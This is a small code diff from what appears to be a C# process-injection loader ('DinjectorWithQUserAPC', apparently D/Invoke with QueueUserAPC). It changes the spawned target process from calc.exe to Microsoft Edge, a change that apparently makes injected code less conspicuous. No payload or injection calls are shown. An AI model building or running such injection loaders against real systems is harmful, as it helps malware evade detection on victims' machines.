@@ -30,7 +30,7 @@ namespace DinjectorWithQUserAPC
             }
 
 
-            string processPath = @"C:\\Windows\\System32\\calc.exe";
+            string processPath = @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";
             STRUCTS.STARTUPINFO si = new STRUCTS.STARTUPINFO();
             STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();
 
